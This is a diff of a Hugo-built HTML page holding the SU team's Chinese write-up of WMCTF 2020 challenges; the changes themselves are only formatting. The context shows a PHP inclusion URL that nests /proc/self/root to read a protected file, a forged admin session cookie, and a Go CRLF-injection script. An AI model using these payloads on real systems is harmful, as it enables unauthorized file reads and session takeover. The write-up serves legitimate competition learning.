@@ -2,7 +2,7 @@
 
 <!DOCTYPE html>
 <html lang="en" itemscope itemtype="http://schema.org/WebPage">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <head>
     
 
   <meta charset="utf-8" />
@@ -15,6 +15,7 @@
       <title>WMCTF 2020 SU Write-Up - su-team</title>
 
   <meta name="description" content="感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 2nd 🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com
+
 以下是我们 SU 本次 WMCTF 2020 的 writeup。">
   <meta name="author" content="SUer"/><script type="application/ld+json">
 {
@@ -64,7 +65,7 @@
     "name" : "SUer"
   },
   "headline": "WMCTF 2020 SU Write-Up",
-  "description" : "感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 2nd 🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com\n以下是我们 SU 本次 WMCTF 2020 的 writeup。\n",
+  "description" : "感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 2nd 🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com 以下是我们 SU 本次 WMCTF 2020 的 writeup。\n",
   "inLanguage" : "en",
   "wordCount":  3086 ,
   "datePublished" : "2020-08-04T21:35:50\u002b08:00",
@@ -88,6 +89,7 @@
 
 <meta property="og:title" content="WMCTF 2020 SU Write-Up" />
 <meta property="og:description" content="感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 2nd 🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com
+
 以下是我们 SU 本次 WMCTF 2020 的 writeup。">
 <meta property="og:image" content="http://localhost:1313/img/SU.jpg" />
 <meta property="og:url" content="http://localhost:1313/post/wmctf-2020-su-wu/" />
@@ -96,6 +98,7 @@
 
   <meta name="twitter:title" content="WMCTF 2020 SU Write-Up" />
   <meta name="twitter:description" content="感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 2nd 🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com
+
 以下是我们 SU 本次 WMCTF 2020 的 writeup。">
   <meta name="twitter:image" content="http://localhost:1313/img/SU.jpg" />
   <meta name="twitter:card" content="summary_large_image" />
@@ -406,12 +409,14 @@
 
         <section class="article-shell">
           <article role="main" class="blog-post">
-            <p>感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 2nd 🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:suers_xctf@126.com">suers_xctf@126.com</a></p>
+            <p>感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 2nd 🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:suers_xctf@126.com">suers_xctf@126.com</a>
+</p>
 <p>以下是我们 SU 本次 WMCTF 2020 的 writeup。</p>
 <h2 id="web">Web</h2>
 <h3 id="web_checkin">web_checkin</h3>
 <p><strong>Third Blood</strong></p>
-<p><a href="http://web_checkin.wmctf.wetolink.com/?content=/flag">http://web_checkin.wmctf.wetolink.com/?content=/flag</a></p>
+<p><a href="http://web_checkin.wmctf.wetolink.com/?content=/flag">http://web_checkin.wmctf.wetolink.com/?content=/flag</a>
+</p>
 <h3 id="make-php-great-again">Make PHP Great Again</h3>
 <p>session 包含</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">io</span>
@@ -443,8 +448,14 @@
 </span></span></code></pre></div><h3 id="make-php-great-again-and-again">Make PHP Great Again And Again</h3>
 <p><strong>Second Blood</strong></p>
 <p>因为 require_once 读不了 flag.php, 根据上一题 flag 的提示是 php 自己的问题, 找了半天发现<br>
-<a href="https://github.com/php/php-src/blob/master/Zend/zend_virtual_cwd.c">https://github.com/php/php-src/blob/master/Zend/zend_virtual_cwd.c</a></p>
-<p><img src="https://hackmd.summershrimp.com/uploads/upload_6c61a5a08c92dbda0b82e77a9ffb0afb.png" alt=""></p>
+<a href="https://github.com/php/php-src/blob/master/Zend/zend_virtual_cwd.c">https://github.com/php/php-src/blob/master/Zend/zend_virtual_cwd.c</a>
+</p>
+<p><img
+  src="https://hackmd.summershrimp.com/uploads/upload_6c61a5a08c92dbda0b82e77a9ffb0afb.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>超过 32 层会停止读符号链接, 所以用 /proc/self/root 套 33 层娃即可</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">v2222</span><span class="o">.</span><span class="n">no_body_knows_php_better_than_me</span><span class="o">.</span><span class="n">glzjin</span><span class="o">.</span><span class="n">wmctf</span><span class="o">.</span><span class="n">wetolink</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="err">?</span><span class="n">file</span><span class="o">=</span><span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="n">filter</span><span class="o">/</span><span class="n">read</span><span class="o">=</span><span class="nb">convert</span><span class="o">.</span><span class="n">base64</span><span class="o">-</span><span class="n">encode</span><span class="o">/</span><span class="n">resource</span><span class="o">=</span><span class="n">compress</span><span class="o">.</span><span class="n">zlib</span><span class="p">:</span><span class="o">//</span><span class="n">file</span><span class="p">:</span><span class="o">///</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">flag</span><span class="o">.</span><span class="n">php</span>
 </span></span></code></pre></div><h3 id="webweb">webweb</h3>
@@ -480,7 +491,8 @@
 <p><strong>First Blood</strong></p>
 <p>三个点, math/rand 是伪随机, 而且不播种的话结果都是一样的, 本地用同样环境搭一个就可以拿到 admin session</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">MTU5NjM2NzAwNnxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQWNBQlhWdVlXMWxCbk4wY21sdVp3d0hBQVZoWkcxcGJnPT182OYB7Y3m7o504Bjnh5dnTgHrQ8H5hNSyzaYxDB0R0Po=
-</span></span></code></pre></div><p>然后老版本 go 能 crlf, <a href="https://github.com/golang/go/issues/30794">https://github.com/golang/go/issues/30794</a></p>
+</span></span></code></pre></div><p>然后老版本 go 能 crlf, <a href="https://github.com/golang/go/issues/30794">https://github.com/golang/go/issues/30794</a>
+</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import requests
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">for i in range(97, 122):
@@ -743,7 +755,8 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    return 0;
 </span></span><span class="line"><span class="cl">}
-</span></span></code></pre></div><p><a href="https://github.com/sibears/IDAGolangHelper/tree/b6e7907755bd57f756a157b3cd7565e7ef7a5dec">https://github.com/sibears/IDAGolangHelper/tree/b6e7907755bd57f756a157b3cd7565e7ef7a5dec</a></p>
+</span></span></code></pre></div><p><a href="https://github.com/sibears/IDAGolangHelper/tree/b6e7907755bd57f756a157b3cd7565e7ef7a5dec">https://github.com/sibears/IDAGolangHelper/tree/b6e7907755bd57f756a157b3cd7565e7ef7a5dec</a>
+</p>
 <h3 id="roshambo">roshambo</h3>
 <p><strong>Second Blood</strong></p>
 <p>2a51&mdash;sha-256
@@ -885,40 +898,91 @@
 </span></span></code></pre></div><h2 id="misc">Misc</h2>
 <h3 id="dalabengba">Dalabengba</h3>
 <p>先用EnigmaVBUnpacker.exe将游戏解包
-<img src="https://hackmd.summershrimp.com/uploads/upload_f40cca716ad4cccb72861350a9b79c3e.png" alt="">
+<img
+  src="https://hackmd.summershrimp.com/uploads/upload_f40cca716ad4cccb72861350a9b79c3e.png"
+  alt=""
+  loading="lazy"
+>
+
 然后开启rpgmaker开一个新项目，把www里面文件拷过去打开
-<img src="https://hackmd.summershrimp.com/uploads/upload_b3e744e636152849dc783d0ff598e507.png" alt="">
+<img
+  src="https://hackmd.summershrimp.com/uploads/upload_b3e744e636152849dc783d0ff598e507.png"
+  alt=""
+  loading="lazy"
+>
+
 在这个网站把素材解包https://petschko.org/tools/mv_decrypter/，把完整的放回文件夹里，这里要修改data/system.json的配置
 &ldquo;hasEncryptedImages&rdquo;: false,
 &ldquo;hasEncryptedAudio&rdquo;: false,
 运行正常使用了
-<img src="https://hackmd.summershrimp.com/uploads/upload_0280daf918a26ff67cafd0d76c9745e5.png" alt="">
+<img
+  src="https://hackmd.summershrimp.com/uploads/upload_0280daf918a26ff67cafd0d76c9745e5.png"
+  alt=""
+  loading="lazy"
+>
+
 查找了国王最后成功的话
-<img src="https://hackmd.summershrimp.com/uploads/upload_5db1d582c9cd1710e90fd9de5e605019.png" alt="">
+<img
+  src="https://hackmd.summershrimp.com/uploads/upload_5db1d582c9cd1710e90fd9de5e605019.png"
+  alt=""
+  loading="lazy"
+>
+
 调试发现还是加密了，用了decText.js里面代码
-参考<a href="http://cache.baiducontent.com/c?m=9d78d513d98303fa4fece4215e4f80260e55f0744cd2c7647dc3923884155f563662f4cb51356704c7823c390ef50f1aa8b12173441e3df2de8d9f4aaae3c97b73c97d73671cf1104f8c04edd64727c621900cb8f81cb3eea6&amp;p=c96fc64ad48c11a058e8d6654948&amp;newp=92769a47cd8911a058e8872b445c92695c02dc3051ddd001298ffe0cc4241a1a1a3aecbb24241502d9c478610abb0f31aba7747d605f76acd1&amp;s=cfcd208495d565ef&amp;user=baidu&amp;fm=sc&amp;query=RPGMAKER%B7%C0%C6%C6%BD%E2&amp;qid=f601feaf00042d52&amp;p1=1">RPGMaker防破解百度快照</a>
+参考<a href="http://cache.baiducontent.com/c?m=9d78d513d98303fa4fece4215e4f80260e55f0744cd2c7647dc3923884155f563662f4cb51356704c7823c390ef50f1aa8b12173441e3df2de8d9f4aaae3c97b73c97d73671cf1104f8c04edd64727c621900cb8f81cb3eea6&amp;amp;p=c96fc64ad48c11a058e8d6654948&amp;amp;newp=92769a47cd8911a058e8872b445c92695c02dc3051ddd001298ffe0cc4241a1a1a3aecbb24241502d9c478610abb0f31aba7747d605f76acd1&amp;amp;s=cfcd208495d565ef&amp;amp;user=baidu&amp;amp;fm=sc&amp;amp;query=RPGMAKER%B7%C0%C6%C6%BD%E2&amp;amp;qid=f601feaf00042d52&amp;amp;p1=1">RPGMaker防破解百度快照</a>
+
 去分析rpg_core.js，推出systemkey:&ldquo;f74592328a168cf858e727078d4f6ab&rdquo;，然后丢回包里看国王说的话，其实可以把所有发现加密的都跑出来看看有哪些东西
-<img src="https://images-cdn.shimo.im/V0etRC2WJpTzNdys__thumbnail.PNG" alt="">
+<img
+  src="https://images-cdn.shimo.im/V0etRC2WJpTzNdys__thumbnail.PNG"
+  alt=""
+  loading="lazy"
+>
+
 emm好像没flag
 第一部分：</p>
 <p>直接跳到最后的天空城关卡
-<img src="https://hackmd.summershrimp.com/uploads/upload_44b8b47e88c65b64871b31003e28c45e.png" alt="">
+<img
+  src="https://hackmd.summershrimp.com/uploads/upload_44b8b47e88c65b64871b31003e28c45e.png"
+  alt=""
+  loading="lazy"
+>
+
 发现移动路线组成单词Pr1nCe5s
 第二部分：
 文件part2.jpg
 前面有一个do you know java ，查了java和图片隐写的东西
 找打java盲水印工具：https://github.com/ww23/BlindWatermark，
 需要拼接一部分，扫描出第二部分
-<img src="https://hackmd.summershrimp.com/uploads/upload_66fa2c8058debf0be49712ab229dc1ad.png" alt="">
+<img
+  src="https://hackmd.summershrimp.com/uploads/upload_66fa2c8058debf0be49712ab229dc1ad.png"
+  alt=""
+  loading="lazy"
+>
+
 W@rR1or</p>
 <p>第三部分：
 前面导入systemkey后使用加密的素材
-<img src="https://hackmd.summershrimp.com/uploads/upload_36ef3f2933fd61a8f638cbfa7bb0197a.png" alt="">
+<img
+  src="https://hackmd.summershrimp.com/uploads/upload_36ef3f2933fd61a8f638cbfa7bb0197a.png"
+  alt=""
+  loading="lazy"
+>
+
 看到国王的话逆序hex-&gt;ascii得到Y0u_@re_5o_bRaVE得到一个文件
-<img src="https://hackmd.summershrimp.com/uploads/upload_238ca188ca474387ad33958b4cbff3be.png" alt="">
+<img
+  src="https://hackmd.summershrimp.com/uploads/upload_238ca188ca474387ad33958b4cbff3be.png"
+  alt=""
+  loading="lazy"
+>
+
 搜文件名s3cr3t找到了个解密的https://gist.github.com/aanoaa/1408846
 出了WhrRrrr~
-<img src="https://hackmd.summershrimp.com/uploads/upload_0d910504a7ecb5dfa598b63708415bb9.png" alt=""></p>
+<img
+  src="https://hackmd.summershrimp.com/uploads/upload_0d910504a7ecb5dfa598b63708415bb9.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <h3 id="xman_happy_birthday">XMAN_Happy_birthday!</h3>
 <p>翻转</p>
 <h3 id="music_game">Music_game</h3>
@@ -931,7 +995,12 @@ W@rR1or</p>
 <h3 id="welcome-to-ctf">Welcome to CTF</h3>
 <p>一个windows逆向,一开始踩坑到了虚假的执行流,虚假的base64,虚假的xor,在init的时候,运行了好多函数,关于异常反调试等等,还有三处调用了ntdll里面的一个可以对抗调试器的函数.</p>
 <p>既然这样,那就直接上trace了,手头有一个写好的工具,配合qemu,trace出了他所有的指令流
-<img src="https://hackmd.summershrimp.com/uploads/upload_eb1e6150524146d82f47f963b35c4a87.png" alt="">
+<img
+  src="https://hackmd.summershrimp.com/uploads/upload_eb1e6150524146d82f47f963b35c4a87.png"
+  alt=""
+  loading="lazy"
+>
+
 发现到这里了,跟进去看了一下,和假的那个函数差不多,直接逆了一下,发现有一个改了表的base64函数,后面是几个明显的大数计算,这里直接patch了他的ntdll那个函数的调用,可以调试了,在进入虚假的check函数时,修改eip到这个函数,手动跳过来,继续调试</p>
 <p>整理出来大概的流程:
 base64decode -&gt; rsa -&gt; 高60bit和低56bit分别做x y,计算x^3 + y^3 + z^3 = 43
@@ -951,12 +1020,27 @@ base64decode -&gt; rsa -&gt; 高60bit和低56bit分别做x y,计算x^3 + y^3 + z
 </span></span><span class="line"><span class="cl">}
 </span></span></code></pre></div><h3 id="meet_in_july">Meet_in_July</h3>
 <p><strong>First Blood</strong></p>
-<p><img src="https://hackmd.summershrimp.com/uploads/upload_adfc7becae87af10ef6798f13fe703ee.png" alt="">
+<p><img
+  src="https://hackmd.summershrimp.com/uploads/upload_adfc7becae87af10ef6798f13fe703ee.png"
+  alt=""
+  loading="lazy"
+>
+
 check格式flag{}长度70
 数字和大写ABCDEF
-<img src="https://hackmd.summershrimp.com/uploads/upload_933b2c51cb597137690981f9004ce0d5.png" alt="">
+<img
+  src="https://hackmd.summershrimp.com/uploads/upload_933b2c51cb597137690981f9004ce0d5.png"
+  alt=""
+  loading="lazy"
+>
+
 字符串转16进制后进sub_401909进行加密
-<img src="https://hackmd.summershrimp.com/uploads/upload_b0b0102d285e2209705ad6e60fcbf3dd.png" alt="">
+<img
+  src="https://hackmd.summershrimp.com/uploads/upload_b0b0102d285e2209705ad6e60fcbf3dd.png"
+  alt=""
+  loading="lazy"
+>
+
 主要是乘法减法mod三个操作</p>
 <p>因为sub_401111操作结果都是32bytes，猜测是一个取模操作。</p>
 <p>用了两组数据算出了模数：</p>
@@ -1074,15 +1158,35 @@ b &amp;\equiv a \cdot z - x \equiv  (x^4-4x^2 + 2) (x^3 - 3x)
 \end{aligned}
 $$</p>
 <p>试了一下，模数n可以被分解为两个素数：</p>
-<p><img src="https://hackmd.summershrimp.com/uploads/upload_aa549cd4b2fea446ef3cede72d45f0ca.png" alt=""></p>
+<p><img
+  src="https://hackmd.summershrimp.com/uploads/upload_aa549cd4b2fea446ef3cede72d45f0ca.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>p = 320265757102059730318470218759311257989
 q = 361550014853497117429835520396253724753</p>
 <p>通过Mathematica可以分别在mod p和mod q上解出来x</p>
-<p><img src="https://hackmd.summershrimp.com/uploads/upload_8cdadd80b40e712d8885735244da2871.png" alt=""></p>
-<p><img src="https://hackmd.summershrimp.com/uploads/upload_4e390411a80f80ec29f9859d80ff4d67.png" alt=""></p>
+<p><img
+  src="https://hackmd.summershrimp.com/uploads/upload_8cdadd80b40e712d8885735244da2871.png"
+  alt=""
+  loading="lazy"
+>
+</p>
+<p><img
+  src="https://hackmd.summershrimp.com/uploads/upload_4e390411a80f80ec29f9859d80ff4d67.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>然后再用CRT即可得到在mod n下的解：17608204545242378720348793798058123425575979093234353645947732994798163637792</p>
 <p>程序输入flag{26EDE3FE048B6BFA04F647259A3F00505FD9C9CCB87298CD631FD91F17CCB620}</p>
-<p><img src="https://hackmd.summershrimp.com/uploads/upload_f4ea85e2037390a2008bdb99f9973dd6.png" alt=""></p>
+<p><img
+  src="https://hackmd.summershrimp.com/uploads/upload_f4ea85e2037390a2008bdb99f9973dd6.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>提交需要将&quot;flag&quot;改成&quot;WMCTF&quot;</p>
 <h3 id="easy_apk">easy_apk</h3>
 <p>一个安卓逆向,字符串都被加密了,看了一下调用了native的check函数,在ida里看了一下check函数,判断长度是不是32,然后取出偶数位,使用AES加密,然后用加密的结果,作为祖冲之算法的密钥加密全部的flag.
@@ -1128,7 +1232,12 @@ q = 361550014853497117429835520396253724753</p>
 </span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">temp_bool</span> <span class="o">==</span> <span class="n">True</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">row</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">            <span class="n">quit</span><span class="p">()</span>
-</span></span></code></pre></div><p><img src="https://hackmd.summershrimp.com/uploads/upload_faf549fca1bd7700eaead38dfb8281f4.png" alt=""></p>
+</span></span></code></pre></div><p><img
+  src="https://hackmd.summershrimp.com/uploads/upload_faf549fca1bd7700eaead38dfb8281f4.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <h3 id="piece_of_cake">piece_of_cake</h3>
 <p>二维格可以用高斯格基规约，多试几组数据就可以跑出来了</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from gmpy2 import iroot, sqrt
@@ -1260,8 +1369,10 @@ q = 361550014853497117429835520396253724753</p>
 <p>改过的DES 6轮差分攻击</p>
 <p>现学：</p>
 <ul>
-<li><a href="https://medium.com/lotus-fruit/breaking-des-using-differential-cryptanalysis-958e8118ff41">https://medium.com/lotus-fruit/breaking-des-using-differential-cryptanalysis-958e8118ff41</a></li>
-<li><a href="http://www.cs.technion.ac.il/~biham/Reports/differential-cryptanalysis-of-the-data-encryption-standard-biham-shamir-authors-latex-version.pdf">http://www.cs.technion.ac.il/~biham/Reports/differential-cryptanalysis-of-the-data-encryption-standard-biham-shamir-authors-latex-version.pdf</a></li>
+<li><a href="https://medium.com/lotus-fruit/breaking-des-using-differential-cryptanalysis-958e8118ff41">https://medium.com/lotus-fruit/breaking-des-using-differential-cryptanalysis-958e8118ff41</a>
+</li>
+<li><a href="http://www.cs.technion.ac.il/~biham/Reports/differential-cryptanalysis-of-the-data-encryption-standard-biham-shamir-authors-latex-version.pdf">http://www.cs.technion.ac.il/~biham/Reports/differential-cryptanalysis-of-the-data-encryption-standard-biham-shamir-authors-latex-version.pdf</a>
+</li>
 </ul>
 <blockquote>
 <p>现学材料里一个可能的疑惑点：第4轮的F函数中，有5个sbox的input(6bit)的差分值都是0，所以这5个sbox的output(4bit)的差分值也都是0，经过P置换后，得到的D&rsquo;中有4*5=20bit是已知的，所以后面第6轮的F函数的output的差分值:$F&rsquo; = c&rsquo; \oplus D&rsquo; \oplus T_L&rsquo;$中，有20bit是确定的；经过<strong>逆</strong>P置换后，得到第6轮8个sbox的outputs的差分值，其中有5个对应的sbox的output的差分值是已知的，所以能用medium里的那个方法把这5个sbox的key求出来。</p>
@@ -1306,7 +1417,12 @@ q = 361550014853497117429835520396253724753</p>
 <p>以前我么得选择，现在我随便选。</p>
 <p>就选这个0x00000040 -&gt; 0x00000000 0.2534</p>
 <p><strong>画图分析</strong></p>
-<p><img src="https://hackmd.summershrimp.com/uploads/upload_c126a80567a8eeab248c3b0ff26319cd.png" alt=""></p>
+<p><img
+  src="https://hackmd.summershrimp.com/uploads/upload_c126a80567a8eeab248c3b0ff26319cd.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <blockquote>
 <p>在线画图：https://draw.io</p>
 </blockquote>
